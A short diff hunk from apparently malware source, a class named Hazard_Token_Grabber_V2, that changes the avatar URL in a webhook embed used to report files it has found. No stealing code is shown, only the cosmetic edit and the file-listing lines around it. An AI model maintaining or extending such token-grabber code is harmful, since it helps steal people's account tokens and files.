@@ -411,7 +411,7 @@ class Hazard_Token_Grabber_V2:
             self.files += f"\n{f}"
         self.fileCount = f"{len(files)} Files Found: "
         embed = {
-            "avatar_url":"http",
+            "avatar_url":"https://i.hizliresim.com/om9pda4.PNG",
             "embeds": [
                 {
                     "author": {
